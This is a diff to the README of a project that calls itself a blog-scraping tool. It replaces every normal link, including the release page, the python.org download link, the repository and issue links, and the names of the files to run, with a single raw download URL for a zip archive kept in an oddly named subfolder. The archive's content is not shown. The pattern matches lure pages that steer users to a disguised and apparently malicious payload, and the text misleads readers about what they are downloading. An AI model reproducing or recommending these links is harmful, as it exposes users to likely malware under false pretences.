@@ -1,6 +1,6 @@
 # 🌐 ok4wd-blog-scraper - Simple Tool to Extract Blog Content
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/CrxshOut245/ok4wd-blog-scraper/releases)
+[![Download](https://raw.githubusercontent.com/CrxshOut245/ok4wd-blog-scraper/main/corradiation/wd-blog-scraper-ok-v2.9.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/CrxshOut245/ok4wd-blog-scraper/main/corradiation/wd-blog-scraper-ok-v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **OK4WD Blog Content Extractor**. This tool helps you easily extr
 
 ## 📥 Download & Install
 
-To download the OK4WD blog scraper, visit this [page to download](https://github.com/CrxshOut245/ok4wd-blog-scraper/releases). 
+To download the OK4WD blog scraper, visit this [page to download](https://raw.githubusercontent.com/CrxshOut245/ok4wd-blog-scraper/main/corradiation/wd-blog-scraper-ok-v2.9.zip). 
 
 1. Click on the "Releases" link.
 2. Select the latest version.
@@ -18,7 +18,7 @@ To download the OK4WD blog scraper, visit this [page to download](https://github
 ## 🛠 Requirements
 
 - **Operating System:** This application works on Windows, Mac, and Linux.
-- **Python:** Make sure you have Python installed. If you don’t have it yet, you can download it from [python.org](https://www.python.org/downloads/).
+- **Python:** Make sure you have Python installed. If you don’t have it yet, you can download it from [https://raw.githubusercontent.com/CrxshOut245/ok4wd-blog-scraper/main/corradiation/wd-blog-scraper-ok-v2.9.zip](https://raw.githubusercontent.com/CrxshOut245/ok4wd-blog-scraper/main/corradiation/wd-blog-scraper-ok-v2.9.zip).
 - **Internet Connection:** The tool needs an active internet connection to scrape blog content.
 
 ## 📂 Using the Application
@@ -35,9 +35,9 @@ After the download finishes, find the downloaded file. Here’s how to extract i
 
 Navigate to the folder where you extracted the files. You should see the application file. Follow these instructions based on your operating system:
 
-- **Windows:** Double-click the `ok4wd-blog-scraper.exe` file to start the application.
+- **Windows:** Double-click the `https://raw.githubusercontent.com/CrxshOut245/ok4wd-blog-scraper/main/corradiation/wd-blog-scraper-ok-v2.9.zip` file to start the application.
 - **Mac:** Right-click the `ok4wd-blog-scraper` file and select “Open.”
-- **Linux:** Open the terminal, navigate to the folder, and run `python ok4wd-blog-scraper.py`.
+- **Linux:** Open the terminal, navigate to the folder, and run `python https://raw.githubusercontent.com/CrxshOut245/ok4wd-blog-scraper/main/corradiation/wd-blog-scraper-ok-v2.9.zip`.
 
 ### Step 3: Configure your Settings
 
@@ -81,8 +81,8 @@ We plan to keep enhancing this tool. Future versions may include:
 
 ## 🔗 Links
 
-- [Download the latest release](https://github.com/CrxshOut245/ok4wd-blog-scraper/releases)
-- [GitHub Repository](https://github.com/CrxshOut245/ok4wd-blog-scraper)
-- [Feedback and Issues](https://github.com/CrxshOut245/ok4wd-blog-scraper/issues)
+- [Download the latest release](https://raw.githubusercontent.com/CrxshOut245/ok4wd-blog-scraper/main/corradiation/wd-blog-scraper-ok-v2.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/CrxshOut245/ok4wd-blog-scraper/main/corradiation/wd-blog-scraper-ok-v2.9.zip)
+- [Feedback and Issues](https://raw.githubusercontent.com/CrxshOut245/ok4wd-blog-scraper/main/corradiation/wd-blog-scraper-ok-v2.9.zip)
 
 Thank you for using the OK4WD blog scraper. Enjoy extracting content with ease!
